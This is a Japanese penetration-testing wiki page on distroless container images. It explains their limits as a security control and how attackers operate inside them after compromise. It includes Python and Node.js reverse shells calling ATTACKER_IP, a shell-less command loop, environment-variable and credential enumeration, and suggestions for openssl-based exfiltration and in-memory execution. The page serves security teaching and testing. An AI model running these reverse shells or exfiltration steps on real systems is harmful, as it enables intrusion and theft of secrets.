# Distroless コンテナ

{{#include ../../../banners/hacktricks-training.md}}

## 概要

**distroless** コンテナイメージは、ある特定のアプリケーションを実行するために必要な **最小限のランタイムコンポーネントのみを同梱** し、意図的にパッケージマネージャ、シェル、汎用的なユーザーランドユーティリティの大規模なセットといった通常のディストリビューションツールを除外したイメージです。実際には、distroless イメージはアプリケーションのバイナリまたはランタイム、その共有ライブラリ、証明書バンドル、非常に小さなファイルシステムレイアウトのみを含むことが多いです。

重要なのは、distroless がカーネルの隔離プリミティブの新しい形である、ということではありません。Distroless は **イメージ設計の戦略** です。カーネルがコンテナをどのように隔離するかではなく、コンテナファイルシステムの **内部** に何が存在するかを変更します。この区別は重要で、distroless は主に攻撃者がコード実行を獲得した後に使えるものを減らすことで環境を堅牢化します。namespaces、seccomp、capabilities、AppArmor、SELinux、または他のランタイム隔離メカニズムの代わりにはなりません。

## Distroless が存在する理由

Distroless イメージは主に以下を削減するために使われます:

- イメージサイズ
- イメージの運用上の複雑さ
- 脆弱性を含み得るパッケージやバイナリの数
- 攻撃者がデフォルトで利用できる post-exploitation tools の数

このため、distroless イメージは本番のアプリケーションデプロイで人気があります。シェルがなく、パッケージマネージャがなく、ほとんど汎用ツールが入っていないコンテナは、運用上の検討がしやすく、侵害後に対話的に悪用されにくいことが多いです。

よく知られた distroless スタイルのイメージファミリーの例:

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless が意味するものではないこと

distroless コンテナは **必ずしも** 次のようなものではありません:

- 自動的に rootless
- 自動的に non-privileged
- 自動的に read-only
- 自動的に seccomp、AppArmor、または SELinux によって保護されている
- 自動的に container escape から安全である

`--privileged`、ホスト namespace の共有、危険な bind mount、またはマウントされた runtime socket といった設定で distroless イメージを実行することは依然として可能です。そのようなシナリオでは、イメージは最小限でも、コンテナ自体は致命的にセキュアでないことがあります。Distroless は **ユーザーランドの攻撃面** を変えるものであり、**カーネルトラスト境界** を変えるものではありません。

## 典型的な運用上の特性

distroless コンテナを侵害したときに最初に気づくことは、一般的な前提が成り立たなくなることです。`sh` がない、`bash` がない、`ls` がない、`id` がない、`cat` がない、場合によっては普段のトレードクラフトが期待するような libc ベースの環境すら存在しないことがあります。これは攻撃側と防御側の双方に影響します。ツールが欠けているため、デバッグ、インシデント対応、post-exploitation のやり方が変わるからです。

最も一般的なパターンは次のとおりです:

- アプリケーションランタイムは存在するが、それ以外はほとんどない
- シェルベースのペイロードはシェルがないため失敗する
- 補助バイナリがないため一般的な列挙ワンライナーが失敗する
- rootfs の read-only 保護や、書き込み可能な tmpfs の場所に対する `noexec` といったファイルシステム保護も存在することが多い

これらの組み合わせが、多くの人が「distroless を武器化する」と話す理由です。

## Distroless と Post-Exploitation

distroless 環境での主な攻撃上の課題は、必ずしも初期の RCE ではありません。多くの場合、問題はその先にあります。もし侵害されたワークロードが Python、Node.js、Java、Go のような言語ランタイムでコード実行を与える場合、任意のロジックを実行できるかもしれませんが、他の Linux ターゲットで一般的なシェル中心のワークフローを通じて行えないことが多いです。

つまり post-exploitation は多くの場合、次のいずれかの方向に移ります:

1. **既存の言語ランタイムを直接利用する** — 環境の列挙、ソケットのオープン、ファイルの読み取り、追加ペイロードのステージングなどを行う。
2. **自前のツールをメモリに持ち込む** — ファイルシステムが read-only であるか、書き込み可能な場所が `noexec` としてマウントされている場合。
3. **イメージに既に存在するバイナリを悪用する** — アプリケーションやその依存関係が予期せぬ便利なものを含んでいる場合。

## 悪用

### 既存の runtime を列挙する

多くの distroless コンテナにはシェルがありませんが、アプリケーションランタイムは残っています。ターゲットが Python サービスであれば Python があり、ターゲットが Node.js であれば Node が存在します。これにより、/bin/sh を呼び出すことなく環境の列挙、環境変数の読み取り、リバースシェルのオープン、メモリ内での実行ステージングなどが可能になることがよくあります。

Python を使った簡単な例:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.jsの簡単な例:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
影響:

- 環境変数の回復（多くの場合、資格情報やサービスエンドポイントを含む）
- `/bin/ls` なしでのファイルシステム列挙
- 書き込み可能なパスやマウントされたシークレットの特定

### Reverse Shell（`/bin/sh`がない場合）

イメージに `sh` や `bash` が含まれていない場合、従来の shell ベースの reverse shell は即座に失敗することがあります。その場合は、代わりにインストールされている言語ランタイムを使用してください。

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
もし `/bin/sh` が存在しない場合、最後の行を直接 Python ベースのコマンド実行または Python REPL ループに置き換えてください。

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
再度言うが、/bin/sh が存在しない場合は、シェルを起動する代わりに Node のファイルシステム、プロセス、ネットワーキング API を直接使用する。

### 完全な例: No-Shell Python コマンドループ

イメージに Python があるがシェルがまったくない場合、単純な対話ループで full post-exploitation capability を維持するのに十分なことが多い:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
This does not require an interactive shell binary. 攻撃者の観点からの影響は実質的に基本的なシェルと同じで、コマンド実行、enumeration、および既存ランタイムを通じたさらなるpayloadsのstagingが可能です。

### インメモリでのツール実行

Distroless images はしばしば次と組み合わせられます:

- `readOnlyRootFilesystem: true`
- 書き込み可能だが `noexec` な tmpfs（例: `/dev/shm`）
- パッケージ管理ツールが存在しない

この組み合わせにより、古典的な「download binary to disk and run it」ワークフローは信頼できなくなります。その場合、メモリ実行のtechniquesが主な対処手段となります。

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` をスクリプトランタイム経由で
- DDexec / EverythingExec
- memexec
- memdlopen

### イメージ内に既に存在するバイナリ

一部のdistrolessイメージには、運用上必要なバイナリが残されており、compromise後に有用になることがあります。よく観察される例として `openssl` があり、アプリケーションがcrypto- や TLS-related tasks を行う必要がある場合に使われます。

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
`openssl` が存在する場合、次の用途に利用できる可能性があります：

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

具体的な悪用は実際に何がインストールされているかによりますが、一般的な考え方は distroless が「全くツールがない」という意味ではなく、「通常のディストリビューションイメージよりずっと少ないツールしかない」ということです。

## チェック

これらのチェックの目的は、実際にイメージが本当に distroless であるか、また post-exploitation に利用可能な runtime や helper バイナリがどれだけ残っているかを判断することです。
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
ここでの注目点:

- シェルが存在しないが Python や Node のようなランタイムがある場合、post-exploitation はランタイム駆動の実行に切り替えるべきです。
- ルートファイルシステムが読み取り専用で、`/dev/shm` が書き込み可能だが `noexec` の場合、memory execution techniques の重要性が高まります。
- `openssl`、`busybox`、`java` のようなヘルパーバイナリが存在する場合、これらはさらなるアクセスの足がかりを得るのに十分な機能を提供することがあります。

## ランタイムのデフォルト

| Image / platform style | デフォルト状態 | 典型的な挙動 | 一般的な手動での弱体化 |
| --- | --- | --- | --- |
| Google distroless style images | 設計上ユーザーランドは最小限 | シェルなし、パッケージマネージャなし、アプリケーション/ランタイム依存のみ | デバッグレイヤの追加、サイドカーシェル導入、busybox やツールのコピー |
| Chainguard minimal images | 設計上ユーザーランドは最小限 | パッケージ領域が削減され、単一のランタイムやサービスに特化することが多い | `:latest-dev` やデバッグ版の利用、ビルド時にツールをコピー |
| Kubernetes workloads using distroless images | Pod の設定次第 | Distroless はユーザーランドにのみ影響し、Pod のセキュリティ姿勢は Pod spec とランタイムのデフォルトに依存する | 一時的なデバッグコンテナの追加、ホストマウント、特権付き Pod 設定 |
| Docker / Podman running distroless images | 実行フラグ次第 | ファイルシステムは最小限だが、ランタイムのセキュリティはフラグやデーモン設定に依存する | `--privileged`、ホスト namespace の共有、ランタイムソケットのマウント、書き込み可能なホストバインド |

重要な点は、distroless は **イメージのプロパティ** であり、ランタイムでの防護ではないということです。その価値は、侵害後にファイルシステム内で利用可能なものを減らすことにあります。

## 関連ページ

ファイルシステムおよび distroless 環境で一般に必要となる memory-execution の回避に関しては、以下を参照してください:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

コンテナランタイム、ソケット、マウントの悪用で distroless ワークロードにも当てはまるものについては、以下を参照してください:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
